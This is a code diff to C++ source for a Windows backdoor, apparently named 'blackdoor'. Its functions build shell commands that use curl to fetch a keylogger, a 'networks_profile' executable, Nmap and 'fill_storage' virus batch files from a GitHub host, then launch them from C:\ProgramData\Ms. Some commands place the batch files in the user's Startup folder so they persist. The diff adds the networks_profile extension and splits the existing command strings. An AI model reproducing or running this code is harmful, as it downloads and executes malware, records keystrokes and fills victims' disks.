@@ -270,17 +270,26 @@ string CE_RunExt(string buffer)
 
     if (ebuf.find("keylog") != string::npos)
     {
-        command += "curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/keylogger.exe -o C:\\ProgramData\\Ms\\keylogger.exe && IF EXIST C:\\ProgramData\\Ms\\keylogger.exe ( start C:\\ProgramData\\Ms\\keylogger.exe ) ELSE ( echo; ) && echo. && echo [EXT] [DOWNLOAD] - keylogextension in C:\\ProgramData\\Ms\\keylogger.exe && echo. && echo [EXT] [RUN] - keylog extension ..";
+        command += "curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/keylogger.exe -o C:\\ProgramData\\Ms\\keylogger.exe && IF EXIST C:\\ProgramData\\Ms\\keylogger.exe ( start C:\\ProgramData\\Ms\\keylogger.exe ) ELSE ( echo; ) ";
+        command += " && echo. && echo [EXT] [DOWNLOAD] - keylogextension in C:\\ProgramData\\Ms\\keylogger.exe && echo. && echo [EXT] [RUN] - keylog extension ..";
         ebuf = command;
     }
     if (ebuf.find("nmap") != string::npos)
     {
-        command += "curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/Nmap.zip -o C:\\ProgramData\\Ms\\Nmap.zip && IF EXIST C:\\ProgramData\\Ms\\Nmap.zip ( powershell -Command \"Expand-Archive -Path \"C:\\ProgramData\\Ms\\Nmap.zip\" -DestinationPath \"C:\\ProgramData\\Ms\"\" ) ELSE ( echo; ) && echo. && echo. && C:\\ProgramData\\Ms\\Nmap\\nmap && echo. && echo. && echo [EXT] [DOWNLOAD] - Nmap extension in C:\\ProgramData\\Ms\\Nmap && echo. && echo [EXT] [RUN] - cd C:\\ProgramData\\Ms\\Nmap && nmap";
+        command += "curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/Nmap.zip -o C:\\ProgramData\\Ms\\Nmap.zip && IF EXIST C:\\ProgramData\\Ms\\Nmap.zip ( powershell -Command \"Expand-Archive -Path \"C:\\ProgramData\\Ms\\Nmap.zip\" -DestinationPath \"C:\\ProgramData\\Ms\"\" ) ELSE ( echo; ) ";
+        command += " && echo. && echo. && echo [EXT] [DOWNLOAD] - Nmap extension in C:\\ProgramData\\Ms\\Nmap && echo [EXT] [RUN] - C:\\ProgramData\\Ms\\Nmap\\nmap";
+        ebuf = command;
+    }
+        if (ebuf.find("networks_profile") != string::npos)
+    {
+        command += "curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/networks_profile.exe -o C:\\ProgramData\\Ms\\networks_profile.exe && IF EXIST C:\\ProgramData\\Ms\\networks_profile.exe ( start C:\\ProgramData\\Ms\\networks_profile.exe ) ELSE ( echo; ) ";
+        command += " && echo. && echo. && echo [EXT] [DOWNLOAD] - networks_profile extension in C:\\ProgramData\\Ms\\networks_profile.exe && echo [EXT] [RUN] - networks_profile extension ..";
         ebuf = command;
     }
     else if (ebuf.find("fill_storage") != string::npos)
     {
-        command += "curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/fill_storage_move.bat -o C:\\ProgramData\\Ms\\fill_storage_move.bat && curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/fill_storage_virus.bat -o C:\\ProgramData\\Ms\\fill_storage_virus.bat && IF EXIST C:\\ProgramData\\Ms\\fill_storage_move.bat ( start C:\\ProgramData\\Ms\\fill_storage_move.bat ) ELSE ( echo; ) && echo. && echo [EXT] [DOWNLOAD] - fill_storage [ move.bat, virus.bat ] extension in C:\\ProgramData\\Ms && echo. && echo [EXT] [RUN] - fill_storage extension ..";
+        command += "curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/fill_storage_move.bat -o C:\\ProgramData\\Ms\\fill_storage_move.bat && curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/fill_storage_virus.bat -o C:\\ProgramData\\Ms\\fill_storage_virus.bat && IF EXIST C:\\ProgramData\\Ms\\fill_storage_move.bat ( start C:\\ProgramData\\Ms\\fill_storage_move.bat ) ELSE ( echo; ) ";
+        command += " && echo. && echo [EXT] [DOWNLOAD] - fill_storage [ move.bat, virus.bat ] extension in C:\\ProgramData\\Ms && echo. && echo [EXT] [RUN] - fill_storage extension ..";
         ebuf = command;
     }
     else
@@ -309,10 +318,11 @@ string CE_StartupExt(string buffer)
     }
     else if (ebuf.find("fill_storage") != string::npos)
     {
-        command += "curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/fill_storage_move.bat -o \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\fill_storage_move.bat\" && curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/fill_storage_virus.bat -o \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\fill_storage_virus.bat\" && IF EXIST \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\fill_storage_move.bat\" ( start \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\fill_storage_move.bat\" ) ELSE ( echo; ) && echo. && echo [CMP] [DOWNLOAD] - fill_storage [ move.bat, virus.bat ] extension in C:\\ProgramData\\Ms\\ && echo [CMP] [RUN] - fill_storage extension ..";
+        command += "curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/fill_storage_move.bat -o \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\fill_storage_move.bat\" && curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/fill_storage_virus.bat -o \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\fill_storage_virus.bat\" && IF EXIST \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\fill_storage_move.bat\" ( start \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\fill_storage_move.bat\" ) ELSE ( echo; ) ";
                 if (ebuf.find("run") != string::npos) {
             command += " && IF EXIST \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\fill_storage_move.bat\" ( start \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\fill_storage_move.bat\" ) ELSE ( echo; ) ";
         }
+        command += " && echo. && echo [CMP] [DOWNLOAD] - fill_storage [ move.bat, virus.bat ] extension in C:\\ProgramData\\Ms\\ && echo [CMP] [RUN] - fill_storage extension ..";
         ebuf = command;
     }
     else
@@ -334,6 +344,11 @@ string CE_StopExt(string buffer)
     {
         ebuf = "powershell -Command \"Stop-Process -Name \"fill_storage_virus\"\" && powershell -Command \"Get-Process | Where-Object {$_.Path -like \"C:\\ProgramData\\Ms\\fill_storage_virus.bat\"} | Stop-Process -WhatIf\"";
     }
+            if (ebuf.find("networks_profile") != string::npos)
+    {
+        ebuf = "powershell -Command \"Stop-Process -Name \"networks_profile\"\" && powershell -Command \"Get-Process | Where-Object {$_.Path -like \"C:\\ProgramData\\Ms\\networks_profile.exe\"} | Stop-Process -WhatIf\"";
+    }
+
 
 
     return ebuf;
